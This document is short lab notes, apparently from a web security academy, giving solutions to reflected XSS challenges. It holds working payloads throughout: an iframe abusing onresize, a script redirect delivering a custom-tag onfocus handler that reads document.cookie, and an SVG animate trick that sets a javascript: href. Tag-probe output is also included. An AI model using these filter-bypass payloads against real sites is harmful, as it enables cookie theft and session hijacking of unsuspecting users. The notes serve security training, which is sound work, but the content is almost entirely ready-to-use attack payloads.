# XSS Labs

# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 


## 3) Reflected XSS into HTML context with all tags blocked except custom ones
* Payload
```html
<script>location = 'https://ac081f4d1fda91bec1dd414e00810097.web-security-academy.net/?search=%3Cbigb0ss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script> 
```

## 4) Reflected XSS with event handlers and href attributes blocked

* Allowed tags
```
[INFO] Allowed tag: a
[INFO] Allowed tag: text
[INFO] Allowed tag: animate
[INFO] Allowed tag: image
[INFO] Allowed tag: svg
[INFO] Allowed tag: title
```

* Allowed "svg" tags
```
[INFO] Allowed tag: a
[INFO] Allowed tag: animate
[INFO] Allowed tag: image
[INFO] Allowed tag: svg
[INFO] Allowed tag: title
```

* Payload
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click Me</text></a>
```